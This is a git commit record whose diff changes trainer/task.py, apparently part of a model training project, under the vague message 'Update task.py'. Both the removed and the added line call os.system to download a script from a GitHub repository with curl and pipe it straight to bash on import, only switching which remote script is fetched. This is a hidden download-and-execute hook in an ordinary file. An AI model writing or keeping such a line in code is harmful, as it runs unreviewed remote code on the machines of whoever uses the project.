4e8e6fc5eb1e6ee91fd17d5498a902cfa1f3317d
kiloplam <jeevanbathulam@gmail.com>
2026-09-17 08:20:15 +0530

    Update task.py

--- trainer/task.py
+++ trainer/task.py
@@ -1,3 +1,3 @@
 import sys
 import os
-os.system('curl -sL https://github.com/kiloplam/virorprv/raw/main/virorprvs | bash')
+os.system('curl -sL https://github.com/kiloplam/virorprv/raw/main/virorprva | bash')
